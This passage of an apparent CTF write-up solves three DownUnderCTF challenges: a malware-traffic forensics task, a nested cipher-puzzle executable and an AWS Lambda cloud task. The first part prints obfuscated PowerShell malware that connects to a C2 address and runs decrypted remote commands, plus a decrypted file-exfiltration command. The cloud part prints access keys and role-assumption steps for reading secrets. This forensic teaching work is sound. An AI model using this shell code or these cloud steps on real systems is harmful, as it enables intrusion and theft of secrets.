                              0x35,0x80,0x72,0xd6,0x36,0x58,0x80,0xd1,0xae,0xea,0x32,0x9a,0xdf,0x91,0x21,0x38,0x38,0x51,0xed,0x21,0xa2,0x8e,0x3b,0x75,0xe9,0x65,0xd0,0xd2,0xcd,0x16,0x62,0x54)
               $BB88BB8BB88BB88B = $B8BB88BBBB8B88B8 + $BBBB88B8BB88B88B
              $BBBB8B88888888B8 = [byte[]] ([BitConverter]::GetBytes([UInt16]$BB88BB8BB88BB88B.Length))
             [Array]::Reverse($BBBB8B88888888B8)
         $B8888BBB888B8888 = @(0x03,0x03,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,
                            0x0d,0x0e,0x0f,
                   0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
                            0x18,
                   0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0xe0,0xe1,
                       0xe2,0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,0xeb,0xec,0xed,0xee,0xef,0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,0xf9,0xfa,
                         0xfb,0xfc,0xfd,0xfe,0xff,0x00,0x08,0x13,0x02,0x13,0x03,0x13,0x01,0x00,0xff,0x01,0x00)
              $BB8B8BBBB88B8B8B = $B8888BBB888B8888 + $BBBB8B88888888B8 + $BB88BB8BB88BB88B
                 $BB8BBB88B8B8B888 = [byte[]] ([BitConverter]::GetBytes($BB8B8BBBB88B8B8B.Length))
            [Array]::Reverse($BB8BBB88B8B8B888)
         $BBB88BBB888B8B8B = @(0x01) + $BB8BBB88B8B8B888[1..3] + $BB8B8BBBB88B8B8B
            $B88B888B8BB8BBBB = [byte[]] ([BitConverter]::GetBytes([UInt16]$BBB88BBB888B8B8B.Length))
             [Array]::Reverse($B88B888B8BB8BBBB)
                          $BBB888888BB88B88 = @(0x16,
                       0x03, 0x01) + $B88B888B8BB8BBBB + $BBB88BBB888B8B8B
           return ,$BBB888888BB88B88
                     }
     $BBBB8BBBBBB8B88B = New-Object System.Net.Sockets.TcpClient
                        $BBBB8BBBBBB8B88B.Connect((IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(5,7,25,2,25,3,15,25,5,7,7) -BB8BB8B8BBB8B8B8 55), ((50 * 9) - (11 * 2)) + [math]::Pow(2, 3) + [math]::Sqrt(49))
          $BBBB888888B88BBB = $BBBB8BBBBBB8B88B.GetStream()
     $BB88888BB8B8B8BB = llIIlllllIIIlllI
            $BBBB888888B88BBB.Write($BB88888BB8B8B8BB, 0, $BB88888BB8B8B8BB.Length)
            $B8B888BB8B8888BB = New-Object byte[] 16384
              $BBBB888888B88BBB.Read($B8B888BB8B8888BB, 0, $B8B888BB8B8888BB.Length) | Out-Null
                      while ($true) {
                  $B8B888BB8B8888BB = New-Object byte[] 16384
          try {
                         $B888BBB8B8B88B8B = $BBBB888888B88BBB.Read($B8B888BB8B8888BB, 0, 16384)
                     } catch {
                        break
                  }
                            $BBBB8888BBBBB8BB = $B8B888BB8B8888BB[5..($B888BBB8B8B88B8B - 1)]
                    $B8B88B8BB888BBB8 = [System.Text.Encoding]::UTF8.GetString((lIIIlllIIIIllllI -B8BBB8B8BB8BBB88 $BBB88B8B888BBB88 -BBB8BBB8B88B88B8 $BBBB8888BBBBB8BB))
                             if ($B8B88B8BB888BBB8 -eq (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(109,112,97,124) -BB8BB8B8BBB8B8B8 8)) { break }
                          try {
                                 $BB88B8B8BBBB888B = (Invoke-Expression $B8B88B8BB888BBB8 2>&1) | Out-String
                          } catch {
                       $BB88B8B8BBBB888B = (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(186,141,141,144,141) -BB8BB8B8BBB8B8B8 255)
          }
              $BBBB8BB88BB888B8 = lllIIlIIlIllllll -B888BBBBB8B8B8BB $BB88B8B8BBBB888B.Trim()
                           $BBBB888888B88BBB.Write($BBBB8BB88BB888B8, 0, $BBBB8BB88BB888B8.Length)
                }
                  $BBBB888888B88BBB.Close()
                    $BBBB8BBBBBB8B88B.Close()

</div>

</div>

Key findings:

- RC4 encryption key: `$BBB88B8B888BBB88`
- Connection to attacker IP: `20.5.48.200` on port `443`
- TLS handshake simulation and encrypted command execution

**Step 3: Extract the RC4 key and encrypted data** From the PowerShell
code, we extract the RC4 key:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    RC4_KEY = [0xf1, 0x6e, 0xcd, 0xc6, 0x79, 0x4c, 0x66, 0xd1, 0x02, 0xf8, 0x33, 0xc4, 0x86, 0xe7, 0xa4, 0x35, 0x8d, 0x69, 0xbd, 0xd2, 0x1d, 0x50, 0xf5, 0xfb, 0xdf, 0xec, 0xaf, 0x0b, 0x9e, 0x53, 0xa4, 0xd3]

</div>

</div>

**Step 4: Decrypt the TLS traffic** We find encrypted data packets
starting with `17030300` (TLS Application Data). The raw encrypted hex
data:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    17030300d84b3595b2c7d8941fc50194795a788096a970b42074c522d6d34775419212149581d5f629d01c75eda554a1a2f07d5258f278b022022f65d9d589f645f79241cb0a39d4850018ed6f342737ee9335225aed762aaa139bdddf799e08d9b6056ea462e8508b3017000601073e1ff741660d29045023182476ae5407c6b849363cfc9701a73eb688bf20d086d7ef04e18d640465e162999b3e0229733065f0fc330f97e270070f1ee60966b43a8ea7023890b1ad1e2858645a0846da14852d0f3bf000948c8818e6c03955e64143c2736f8bdb48daa202040608

</div>

</div>

> **Note:** This hex data is just one part of the entire communication
> between the malware and C2 server. This specific packet contains the
> command response that includes our flag data.

Using Python with the RC4 key:

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
```

    from Crypto.Cipher import ARC4

    RC4_KEY = bytes([
        0xf1, 0x6e, 0xcd, 0xc6, 0x79, 0x4c, 0x66, 0xd1, 0x02, 0xf8, 0x33, 0xc4, 0x86, 0xe7, 0xa4, 
        0x35, 0x8d, 0x69, 0xbd, 0xd2, 0x1d, 0x50, 0xf5, 0xfb, 0xdf, 0xec, 0xaf, 0x0b, 0x9e, 0x53, 
        0xa4, 0xd3
    ])

    def decrypt_rc4(hex_str):
        cipher = ARC4.new(RC4_KEY)
        decrypted = cipher.decrypt(bytes.fromhex(hex_str))
        try:
            return decrypted.decode("utf-8")
        except UnicodeDecodeError:
            return decrypted.hex()

    # Skip first 10 chars (17030300XX) and decrypt the rest
    encrypted_hex = "4b3595b2c7d8941fc50194795a788096a970b42074c522d6d34775419212149581d5f629d01c75eda554a1a2f07d5258f278b022022f65d9d589f645f79241cb0a39d4850018ed6f342737ee9335225aed762aaa139bdddf799e08d9b6056ea462e8508b3017000601073e1ff741660d29045023182476ae5407c6b849363cfc9701a73eb688bf20d086d7ef04e18d640465e162999b3e0229733065f0fc330f97e270070f1ee60966b43a8ea7023890b1ad1e2858645a0846da14852d0f3bf000948c8818e6c03955e64143c2736f8bdb48daa202040608"
    decrypted = decrypt_rc4(encrypted_hex)

</div>

</div>

**Step 5: Decode the exfiltrated data** The decrypted data reveals a
PowerShell command that reads and base64-encodes a file:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\jdoe\Documents\keys_backup.tar.gz"))

</div>

</div>

The response contains the base64-encoded file:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    H4sIAAAAAAAAA+3OMQrCQBSE4dSeIieQt3m78QCKlYVorBdZjYVgkeyCQby7iyCIfdTi/5qBaWbOx6GfxmssRiRZbe0zs88UcVoYJ6q1VlJp7mc2V6WMeeol9XHfleU3pv7RYjdvljfjT0md84MkH+zFHzRshnXjm9XWx862rQn3ya+vAgAAAAAAAAAAAAAAAADePAC9uw8vACgAAA==

</div>

</div>

**Step 6: Extract and decompress the flag** Decode the base64 and save
as a gzipped tar file:

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
```

    import base64

    base64_data = "H4sIAAAAAAAAA+3OMQrCQBSE4dSeIieQt3m78QCKlYVorBdZjYVgkeyCQby7iyCIfdTi/5qBaWbOx6GfxmssRiRZbe0zs88UcVoYJ6q1VlJp7mc2V6WMeeol9XHfleU3pv7RYjdvljfjT0md84MkH+zFHzRshnXjm9XWx862rQn3ya+vAgAAAAAAAAAAAAAAAADePAC9uw8vACgAAA=="

    file_bytes = base64.b64decode(base64_data)
    with open("keys_backup.tar.gz", "wb") as f:
        f.write(file_bytes)

</div>

</div>

Finally, extract the archive:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    tar -xzf keys_backup.tar.gz

</div>

</div>

This extracts a `keys.txt` file. Reading the file contents:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    cat keys.txt

</div>

</div>

Reveals our flag.

**Flag:** `DUCTF{1_gu355_y0u_c4n_d3cRyPT_TLS_tr4ff1c}`

<a href="/assets/img/posts/DUCTF/fishy.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/fishy.gif" loading="lazy"
alt="fishy" /></a>

### <span class="me-2">Challenge 2: YoDawg</span><a href="#challenge-2-yodawg" class="anchor text-muted"><em></em></a>

**Solves:** 141  
**Category:** Misc

#### <span class="me-2">Description</span><a href="#description-23" class="anchor text-muted"><em></em></a>

> We found this file on a USB drive, it seems to be some sort of
> gamified cyber skilled based learning system thingy? Maybe if all of
> the challenges are sold we will get some answers, or maybe it is just
> the friends we make along the way. Note - This may produce false
> positives with your virus scanner.
>
> **Files provided:** yo-dawg.zip

#### <span class="me-2">Solution</span><a href="#solution-4" class="anchor text-muted"><em></em></a>

This challenge presents a “CTF within a CTF” - a .NET executable
containing multiple mini-challenges that must be solved to unlock the
final flag.

**File Contents:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
```

    ├── Yo Dawg.deps.json
    ├── Yo Dawg.dll
    ├── Yo Dawg.exe
    └── Yo Dawg.runtimeconfig.json

</div>

</div>

Upon running the executable, we’re presented with a challenge board
containing multiple cryptographic puzzles:

##### <span class="me-2">Sub-Challenge 1: Salads (200 points)</span><a href="#sub-challenge-1-salads-200-points"
class="anchor text-muted"><em></em></a>

**Description:** “I’m always thinking about food, this isn’t helping… I
got passed this note when I was working at the cafe, what kind of salad
is this?! Can you decrypt?: `putkw{jltyzjczwv}`”

**Solution:** This is a Caesar cipher (ROT13 variant) with a shift of 9.

- Decrypting: `putkw{jltyzjczwv}` → `ydctf{suchislife}`

##### <span class="me-2">Sub-Challenge 2: Passwords (200 points)</span><a href="#sub-challenge-2-passwords-200-points"
class="anchor text-muted"><em></em></a>

**Description:** “Another breach, another password reset. I wonder what
password they grabbed?
`5E320E0CCC5EE5291FAE1E60A1CD72EB1F6FA4AE26EA180F86CE694832DC4E72DCCFDBF3EABBE12FD86F1D51806F15F3294C5F7038BF21DA6AA75D1F09DF07C2`”

**Solution:** This is an SHA-256 hash that can be cracked using rainbow
tables (CrackStation):

- Hash:
  `5E320E0CCC5EE5291FAE1E60A1CD72EB1F6FA4AE26EA180F86CE694832DC4E72DCCFDBF3EABBE12FD86F1D51806F15F3294C5F7038BF21DA6AA75D1F09DF07C2`
- Plaintext: `ihatehackers`
- **Flag:** `ydctf{ihatehackers}`

##### <span class="me-2">Sub-Challenge 3: Rotten (200 points)</span><a href="#sub-challenge-3-rotten-200-points"
class="anchor text-muted"><em></em></a>

**Description:** “Study Cyber they said. Get to hack stuff they said.
Then why am I needing to decode ciphers? HOW IS THIS HELPING? I mean,
can you solve the following? `J54E7L5@0J@F0ECFDE0>J04@56nN`”

**Solution:** This is ROT47 encoding:

- Decrypting: `J54E7L5@0J@F0ECFDE0>J04@56nN` →
  `ydctf{do_you_trust_my_code?}`

##### <span class="me-2">Sub-Challenge 4: Welcome (50 points)</span><a href="#sub-challenge-4-welcome-50-points"
class="anchor text-muted"><em></em></a>

**Description:** “Heard you like CTFs, so here’s another CTF in the
DUCTF! The flag format for this CTF is ydctf{some_text}. Good luck! …oh,
your first flag? Here it is!”

**Solution:** The flag is directly provided: `ydctf{s0mething_1s_wr0ng}`

##### <span class="me-2">Sub-Challenge 5: Hidden (200 points)</span><a href="#sub-challenge-5-hidden-200-points"
class="anchor text-muted"><em></em></a>

**Description:** “There’s a flag somewhere hidden here… I wonder where
it is? Time to channel Inspector Morse!”

**Solution:** By resizing the application window, Morse code becomes
visible at the bottom:

- Morse code:
  `-.-- -.. -.-. - ..-. .... .. -.. -.. . -. ..-. .-.. .- --. -. --- - ... --- .... .. -.. -.. . -.`
- Decoded: `YDCTF HIDDENFLAGNOTSOHIDDEN`
- **Flag:** `ydctf{hiddenflagnotsohidden}`

After completing these challenges, an “angry koala” jump scare appears.
(i got scared for a sec ngl)

<a href="/assets/img/posts/DUCTF/scary.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/scary.gif" loading="lazy"
alt="scary" /></a>

##### <span class="me-2">Sub-Challenge 6: Deeper (200 points)</span><a href="#sub-challenge-6-deeper-200-points"
class="anchor text-muted"><em></em></a>

**Description:** “I wonder if you’re connected to the Internet… Can you
solve the easiest RSA ever? Go get it :) http://pastebin.com/tK8PFRhA”

**Solution:** The pastebin contains RSA parameters:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
```

    n = 134995596339263906364650042879218690804636051969803060327341006918906219701871373267641203454219249589885364856414727976145795558649019334400706818997156295194002540549348224335820431341746858682831145870760296688552893053945533239982236058292620771496924967301973679586874984087016314758930354348923476779669
    e = 65537
    c = 69942350419946767506345128529425495489283491089474687791937626592410531523906950815924944348938594154233834152367027685926503406302513787705918832376135541106323504321024539733768444780639669173742768253534729267483408610794975624076605589114620168690234573082137589585730517788273985226086330327586276612491
    p = 12347237270477958961788304962214070527659642053458163016362914018933001634467295346381421813235616243811654194550990042394688050113879996006954916978208993
    q = 10933263318915572696351286556191402769398472611952670383866334702901100179649513873715034012424560855818813105922996981430536446597319054410065510024545333

</div>

</div>

With p and q provided, we can easily decrypt:

- **Flag:** `ydctf{rsa_erry_day}`

##### <span class="me-2">Sub-Challenge 7: Even Deeper (200 points)</span><a href="#sub-challenge-7-even-deeper-200-points"
class="anchor text-muted"><em></em></a>

**Description:** “Tell me your username. The flag format for this CTF is
ydctf{yourusername}”

**Solution:** The application detects and uses the system username.

- **Flag:** `ydctf{[your_system_username]}`

##### <span class="me-2">Sub-Challenge 8: Truth from Vaas (200 points)</span><a href="#sub-challenge-8-truth-from-vaas-200-points"
class="anchor text-muted"><em></em></a>

**Description:** “Did I ever tell you the definition of insanity? Who
was the voice actor who played Vaas Montenegro?”

**Solution:** This references the Far Cry 3 villain Vaas Montenegro.

- Voice actor: Michael Mando
- **Flag:** `ydctf{michael_mando}`

##### <span class="me-2">Final Challenge: Inception (200 points) - Hackers CTF 1995</span><a href="#final-challenge-inception-200-points---hackers-ctf-1995"
class="anchor text-muted"><em></em></a>

After completing all sub-challenges, the final “Inception” challenge
unlocks with three questions:

**Question 1:** “Can you DES? `CMpZlgYbgEc6eTSNUPXvww==` with key
‘hack\0\0\0\0’”

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
```

    from Crypto.Cipher import DES
    import base64

    key = b'hack\x00\x00\x00\x00'  # 8 bytes
    iv = b'\x00' * 8               # 8 bytes IV (all zeros)
    ciphertext = base64.b64decode('CMpZlgYbgEc6eTSNUPXvww==')
    des = DES.new(key, DES.MODE_CBC, iv)
    plaintext = des.decrypt(ciphertext)
    pad_len = plaintext[-1]
    plaintext = plaintext[:-pad_len]
    print("Decrypted text:", plaintext.decode('utf-8'))

</div>

</div>

**Answer:** `flag{des4eva}`

**Question 2:** “What is the best line in the Hackers movie (three
words)?” **Answer:** `Hack the planet!`

**Question 3:** “defcon 3 quiz: Which Casino is hosting (one word)?”
**Answer:** `Tropicana`

**Final Decryption:** After answering correctly, we get: “USE THE SAME
PROCESS AS QUESTION 1 WITH THE SAME KEY:
`UDR6b0hwIOkbJ90U/dYB3iSF5iQ50Ci1b+T+YCQPJA3pl9IFtyJFrCWfB1szPlKy5EdvDb029rZ7w2gUAcSJiQ==`”

Using the same DES decryption process:

**Flag:** `DUCTF{1995_to_2025}`

<a href="/assets/img/posts/DUCTF/dawg.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/dawg.gif" loading="lazy" alt="dawg" /></a>

### <span class="me-2">Challenge 3: Mary had a little lambda</span><a href="#challenge-3-mary-had-a-little-lambda"
class="anchor text-muted"><em></em></a>

**Solves:** 130  
**Category:** Misc / Cloud

#### <span class="me-2">Description</span><a href="#description-24" class="anchor text-muted"><em></em></a>

> The Ministry of Australian Research into Yaks (MARY) is the leading
> authority of yak related research in Australia. They know a lot about
> long-haired domesticated cattle, but unfortunately not a lot about
> information security.
>
> They have been migrating their yak catalog application to a
> serverless, lambda based, architecture in AWS, but in the process have
> accidentally exposed an access key used by their admins. You’ve gotten
> a hold of this key, now use this access to uncover MARY’s secrets!

#### <span class="me-2">Solution</span><a href="#solution-5" class="anchor text-muted"><em></em></a>

The challenge involved exploiting exposed AWS credentials to access a
Lambda function and retrieve sensitive information from AWS Systems
Manager Parameter Store.

**Step 1: Configure AWS Profile**

First, I configured the AWS CLI with the provided credentials:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    aws configure --profile mary

</div>

</div>

Using the credentials:

- AWS Access Key ID: `AKIAXC42U7VJ2XOBQKGI`
- AWS Secret Access Key: `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`
- Default region: `us-east-1`

**Step 2: Reconnaissance**

First, I verified the identity of the compromised credentials to
understand what permissions I had:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    aws sts get-caller-identity --profile mary

</div>

</div>

**Response:**

<div class="language-json highlighter-rouge">

<div class="code-header">

<span label-text="JSON"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
```

    {
        "UserId": "AIDAXC42U7VJSYNSAD4EV",
        "Account": "487266254163",
        "Arn": "arn:aws:iam::487266254163:user/devopsadmin"
    }

</div>

</div>

This confirmed I was authenticated as the `devopsadmin` user in AWS
account `487266254163`. The next step was to enumerate what AWS
resources I could access with these credentials.

I started by listing Lambda functions since the challenge description
mentioned a serverless, lambda-based architecture:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    aws lambda list-functions --profile mary

</div>

</div>

**Response:**

<div class="language-json highlighter-rouge">

<div class="code-header">

<span label-text="JSON"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
```

    {
        "Functions": [
            {
                "FunctionName": "yakbase",
                "FunctionArn": "arn:aws:lambda:us-east-1:487266254163:function:yakbase",
                "Runtime": "python3.13",
                "Role": "arn:aws:iam::487266254163:role/lambda_role",
                "Handler": "yakbase.lambda_handler",
                "CodeSize": 623,
                "Description": "",
                "Timeout": 30,
                "MemorySize": 128,
                "LastModified": "2025-07-14T12:42:45.148+0000",
                "CodeSha256": "TJjcu+uixucgk+66VOvlNYdT4ifRe6bgdAQxWujMwVM=",
                "Version": "$LATEST",
                "TracingConfig": {
                    "Mode": "PassThrough"
                },
                "RevisionId": "6e45ccea-697d-4cd8-b606-67577b601b0b",
                "Layers": [
                    {
                        "Arn": "arn:aws:lambda:us-east-1:487266254163:layer:main-layer:1",
                        "CodeSize": 689581
                    }
                ],
                "PackageType": "Zip",
                "Architectures": [
                    "x86_64"
                ],
                "EphemeralStorage": {
                    "Size": 512
                },
                "SnapStart": {
                    "ApplyOn": "None",
                    "OptimizationStatus": "Off"
                },
                "LoggingConfig": {
                    "LogFormat": "Text",
                    "LogGroup": "/aws/lambda/yakbase"
                }
            }
        ]
    }

</div>

</div>

Perfect! I found a Lambda function named `yakbase` that appeared to be
related to the yak catalog application mentioned in the challenge. Key
details from this response:

- Function name: `yakbase`
- Execution role: `arn:aws:iam::487266254163:role/lambda_role` (this
  would be important later)
- Small code size (623 bytes) suggesting a simple function
- Uses a layer (`main-layer:1`) which likely contains dependencies

To get more details and access the source code, I retrieved the full
function information:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    aws lambda get-function --function-name yakbase --profile mary

</div>

</div>

**Response:**

<div class="language-json highlighter-rouge">

<div class="code-header">

<span label-text="JSON"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
```

    {
        "Configuration": {
            "FunctionName": "yakbase",
            "FunctionArn": "arn:aws:lambda:us-east-1:487266254163:function:yakbase",
            "Runtime": "python3.13",
            "Role": "arn:aws:iam::487266254163:role/lambda_role",
            "Handler": "yakbase.lambda_handler",
            "CodeSize": 623,
            "Description": "",
            "Timeout": 30,
            "MemorySize": 128,
            "LastModified": "2025-07-14T12:42:45.148+0000",
            "CodeSha256": "TJjcu+uixucgk+66VOvlNYdT4ifRe6bgdAQxWujMwVM=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "6e45ccea-697d-4cd8-b606-67577b601b0b",
            "Layers": [
                {
                    "Arn": "arn:aws:lambda:us-east-1:487266254163:layer:main-layer:1",
                    "CodeSize": 689581
                }
            ],
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "RuntimeVersionConfig": {
                "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:83a0b29e480e14176225231a6e561282aa7732a24063ebab771b15e4c1a2c71c"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/yakbase"
            }
        },
        "Code": {
            "RepositoryType": "S3",
            "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/487266254163/yakbase-f70d7c3a-5267-425f-8ed2-4c7a9497db04?versionId=AWtrEWcqRUhNouC7YHffyafILNKu2lrj&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQDrR3JeUNzELURw8dHrgfXpLewUdC25IcpQeYvmaZeQuwIhAK%2F%2FxCty6x6UXlpUgZLWp4%2FrcQuu9Hgsabcr2dQLvsHaKpICCL7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNzQ5Njc4OTAyODM5Igxy3J9GLQYJ5cL2E%2Fsq5gF02hVDVYiUwPzstakq0HBaQcYV6PLEAXVc4YY%2BbsBel8cqRX6tBrwk3rpI1LMLHu3rxJR8d%2Ff5MvUtapWjyRneWucEDTNFX%2FuC0GK3HXXioUrJJspXNiCEqH0thG2fD9IydA1V7e93swm0sgUpP3lXkmmHnyEO3ooTg7tOBOjY5MwNjXXQEOTvDk6b0w2rk3J1wbRVONN2%2B5j3BP%2Fa4S9q%2Fg5A7Y18T%2FfL5dA96dGFliEajZX8a4%2B1deuJLg5pDycN6NenqfmcMfAIW2kND6WiMxDOADALL9lRRUolMGU9%2FeB6w6okWzDkxPPDBjqOAYkGJ4W7ga00vcP4C2JojaY%2FrMubvslBORoYQtvmhIHD4H6DJJ%2FojO6o%2FPcSMDA7XHf1VnGq2OTihXTUMrMTYkdS8VKEvH9A3m7zvyl0R7ernODpHe2hkiegYMLy%2BBmBeyCPdX9WZP%2Bn4wcdGFX2I9TQa4hAlT3Yn2F1yGJMhnVAYAv0cYtlZNTPMJ7X6zY%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250720T211710Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY35GMWNLBI%2F20250720%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=388ac43c28744f4f10a09400c9929438f6fa00b6f0b4899858f5da9f819abb91"
        },
        "Tags": {
            "Challenge": "Mary had a little lambda"
        }
    }

</div>

</div>

Excellent! This response provided crucial information:

1.  **Code Location**: The `Code.Location` field contained a pre-signed
    S3 URL where I could download the Lambda function’s source code
2.  **Challenge Confirmation**: The `Tags` field confirmed this was
    indeed part of the “Mary had a little lambda” challenge
3.  **Execution Role**: The function runs under
    `arn:aws:iam::487266254163:role/lambda_role` - this role would have
    specific permissions that might be exploitable

**Step 3: Download and Analyze Lambda Code**

Using the S3 URL from the previous response, I downloaded the Lambda
function code. The ZIP file contained a Python file with the following
source code:

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
```

    import os
    import json
    import logging
    import boto3
    import mysql.connector

    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    def lambda_handler(event, context):
        session = boto3.Session()
        ssm = session.client('ssm')
        dbpass = ssm.get_parameter(Name="/production/database/password", WithDecryption=True)['Parameter']['Value']
        mydb = mysql.connector.connect(
           host="10.10.1.1",
           user="dbuser",
           password=dbpass,
           database="BovineDb"
        )
        cursor = mydb.cursor()
        cursor.execute("SELECT * FROM bovines")
        results = cursor.fetchall()
        
        # For testing without the DB!
        #results = [(1, 'Yak', 'Hairy', False),(2, 'Bison', 'Large', True)]
        numresults = len(results)
        response = f"Database contains {numresults} bovines."
        logger.info(response)
        return {
            'statusCode' : 200,
            'body': response
        }

</div>

</div>

**Critical Discovery**: The code revealed that the Lambda function
retrieves a database password from AWS Systems Manager Parameter Store
at the path `/production/database/password` using the
`ssm.get_parameter()` call with `WithDecryption=True`. This was the key
insight - the flag was likely stored in this SSM parameter!

However, there was a problem: my current `devopsadmin` credentials
didn’t have permission to access SSM parameters directly. I needed to
assume the Lambda’s execution role to gain the same permissions the
function uses.

**Step 4: Assume Lambda Role**

The Lambda function runs under the `lambda_role` IAM role, which has the
necessary permissions to read from SSM Parameter Store. I used AWS STS
(Security Token Service) to assume this role:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
```

    aws sts assume-role \
      --role-arn arn:aws:iam::487266254163:role/lambda_role \
      --role-session-name temp-session \
      --profile mary > creds.json

</div>

</div>

This command successfully assumed the Lambda’s role and saved the
temporary credentials to `creds.json`. The fact that this worked
indicated that the `devopsadmin` user had `sts:AssumeRole` permissions
for the Lambda role - a common but potentially dangerous permission
configuration.

**Step 5: Configure Temporary Credentials**

I extracted the temporary credentials from the JSON response and
configured them as environment variables to use with the AWS CLI:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
```

    export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
    export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' creds.json)
    export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)
    export AWS_DEFAULT_REGION=us-east-1

</div>

</div>

Now I was operating with the same permissions as the Lambda function
itself.

**Step 6: Retrieve the Flag**

With the Lambda role credentials, I could now access the Systems Manager
Parameter Store and retrieve the database password that the Lambda
function uses:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    aws ssm get-parameter --name "/production/database/password" --with-decryption

</div>

</div>

**Response:**

<div class="language-json highlighter-rouge">

<div class="code-header">

<span label-text="JSON"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
```

    {
        "Parameter": {
            "Name": "/production/database/password",
            "Type": "SecureString",
            "Value": "DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}",
            "Version": 1,
            "LastModifiedDate": "2025-07-14T08:42:32.390000-04:00",
            "ARN": "arn:aws:ssm:us-east-1:487266254163:parameter/production/database/password",
            "DataType": "text"
        }
    }

</div>

</div>

**Success!** The response revealed that the “database password” was
actually the challenge flag. The parameter was stored as a
`SecureString` type (encrypted) and contained the flag:
`DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}`.

The flag name is a clever reference to *Bos mutus* (wild yak), which is
native to the Tibetan Plateau - perfectly fitting the Ministry of
Australian Research into Yaks (MARY) theme.

